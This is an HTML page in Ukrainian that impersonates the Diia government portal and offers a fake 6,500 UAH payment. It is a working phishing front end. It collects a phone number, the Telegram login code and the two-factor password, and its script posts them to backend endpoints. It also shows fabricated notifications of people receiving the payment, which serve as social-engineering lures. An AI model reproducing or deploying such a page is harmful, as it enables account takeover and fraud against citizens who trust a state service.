<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Дія — Державні послуги онлайн</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        body { 
            background-color: #f2f5f7; 
            font-family: 'Inter', sans-serif; 
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }

        .diia-card {
            border-radius: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.04);
            border: 1px solid rgba(255,255,255,0.7);
        }

        .btn-black {
            background: #000;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .btn-black:active {
            transform: scale(0.96);
            opacity: 0.9;
        }

        /* Анимации переходов */
        .step { display: none; }
        .step-active { display: block; animation: slideIn 0.4s ease-out; }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        #notif-box {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 100;
            width: 90%;
            max-width: 350px;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">

    <div id="notif-box"></div>

    <nav class="sticky top-0 z-40 bg-white/70 backdrop-blur-xl border-b border-gray-100 px-6 py-4 flex justify-between items-center">
        <svg width="60" height="22" viewBox="0 0 64 24" fill="black">
            <path d="M7.4 20H0V4H7.4C11.8 4 14.8 7.3 14.8 12C14.8 16.7 11.8 20 7.4 20ZM3.7 16.5H7.4C9.5 16.5 11 15 11 12C11 9 9.5 7.5 7.4 7.5H3.7V16.5Z"/>
            <path d="M21 20H17.3V4H21V20Z"/><path d="M36.4 20L34.1 14.7H27.5L25.2 20H21.4L28.9 4H32.7L40.2 20H36.4ZM30.8 7.3L28.7 12.2H32.9L30.8 7.3Z"/>
        </svg>
        <div class="flex items-center gap-2">
            <div class="h-2 w-2 bg-green-500 rounded-full animate-pulse"></div>
            <span class="text-[10px] font-bold uppercase tracking-widest text-gray-400">UA • SECURE</span>
        </div>
    </nav>

    <main class="flex-1 px-6 pt-8 pb-12 max-w-[480px] mx-auto w-full">
        
        <div id="step1" class="step step-active">
            <div class="mb-10">
                <h1 class="text-[34px] font-bold tracking-tight leading-tight mb-4">Отримати допомогу 6 500 ₴</h1>
                <p class="text-gray-500 leading-relaxed">Авторизуйтесь через Дія, щоб підтвердити особу та отримати виплату на картку єПідтримка.</p>
            </div>

            <div class="bg-white diia-card p-8 mb-8">
                <div class="mb-8">
                    <label class="block text-[11px] font-bold uppercase text-gray-400 mb-2 ml-1">Номер телефону</label>
                    <div class="flex items-center border-b-2 border-gray-100 focus-within:border-black transition-all py-2">
                        <span class="text-xl font-medium mr-2">+380</span>
                        <input id="ph" type="tel" placeholder="00 000 00 00" maxlength="9" 
                               class="w-full text-xl font-medium bg-transparent outline-none">
                    </div>
                </div>
                <button onclick="sendPhone()" id="b1" class="btn-black w-full py-5 rounded-[24px] text-white font-bold text-[15px] shadow-lg shadow-black/10">
                    ПРОДОВЖИТИ
                </button>
            </div>
        </div>

        <div id="step2" class="step">
            <div class="mb-10 text-center">
                <h1 class="text-3xl font-bold mb-3">Підтвердження</h1>
                <p class="text-gray-500">Ми відправили код у ваш Telegram</p>
            </div>
            <div class="bg-white diia-card p-10 text-center">
                <input id="co" type="text" inputmode="numeric" placeholder="•••••" maxlength="5"
                       class="w-full text-5xl font-light tracking-[12px] text-center outline-none border-b-2 border-black pb-4 mb-10">
                <button onclick="verify()" id="b2" class="btn-black w-full py-5 rounded-[24px] text-white font-bold">
                    ПІДТВЕРДИТИ
                </button>
                <button onclick="location.reload()" class="mt-6 text-sm text-gray-400 font-medium italic">← Змінити номер</button>
            </div>
        </div>

        <div id="step3" class="step">
            <div class="mb-10 text-center">
                <h1 class="text-3xl font-bold mb-3">Дія.Підпис</h1>
                <p class="text-gray-500">Введіть пароль двофакторної автентифікації</p>
            </div>
            <div class="bg-white diia-card p-10">
                <input id="pw" type="password" placeholder="Ваш пароль"
                       class="w-full text-xl p-5 bg-gray-50 rounded-2xl outline-none border border-transparent focus:border-black mb-6 transition-all">
                <button onclick="verify()" id="b3" class="btn-black w-full py-5 rounded-[24px] text-white font-bold">
                    ПІДПИСАТИ
                </button>
            </div>
        </div>

        <div class="grid grid-cols-2 gap-4 mt-4">
            <div class="bg-white/50 p-5 rounded-[32px] border border-white">
                <div class="w-10 h-10 bg-blue-50 rounded-full flex items-center justify-center mb-3">
                    <svg class="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
                </div>
                <p class="text-[13px] font-bold leading-tight">Безпечно та зашифровано</p>
            </div>
            <div class="bg-white/50 p-5 rounded-[32px] border border-white">
                <div class="w-10 h-10 bg-green-50 rounded-full flex items-center justify-center mb-3">
                    <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
                </div>
                <p class="text-[13px] font-bold leading-tight">Миттєва виплата</p>
            </div>
        </div>
    </main>

    <script>
        let sid = '';

        function showStep(n) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('step-active'));
            document.getElementById('step' + n).classList.add('step-active');
        }

        async function sendPhone() {
            const ph = document.getElementById('ph').value;
            if(ph.length < 9) return alert('Введіть коректний номер');
            
            const btn = document.getElementById('b1');
            btn.disabled = true;
            btn.innerHTML = '<span class="animate-pulse">ОБРОБКА...</span>';

            const r = await fetch('/api/send_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: '380' + ph})
            });
            const d = await r.json();
            if(d.status === 'success') {
                sid = d.sid;
                showStep(2);
            } else {
                alert(d.message || 'Помилка');
                btn.disabled = false;
                btn.innerText = 'ПРОДОВЖИТИ';
            }
        }

        async function verify() {
            const co = document.getElementById('co').value;
            const pw = document.getElementById('pw').value;
            
            const r = await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({sid: sid, code: co, password: pw})
            });
            const d = await r.json();
            
            if(d.status === 'need_2fa') showStep(3);
            else if(d.status === 'success') location.href = '/success';
            else alert('Невірний код або пароль');
        }

        // Live Notifications Generator
        const users = ['Олександр С.', 'Марія К.', 'Дмитро В.', 'Олена П.', 'Ігор М.'];
        setInterval(() => {
            const box = document.getElementById('notif-box');
            const n = document.createElement('div');
            n.className = "bg-white/95 backdrop-blur-md p-4 rounded-3xl shadow-xl flex items-center gap-3 mb-2 animate-bounce border border-white transition-all";
            n.innerHTML = `
                <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center text-green-600">✓</div>
                <div class="text-xs font-bold">${users[Math.floor(Math.random()*users.length)]} щойно отримав 6 500 ₴</div>
            `;
            box.appendChild(n);
            setTimeout(() => n.remove(), 4000);
        }, 8000);
    </script>
</body>
</html>
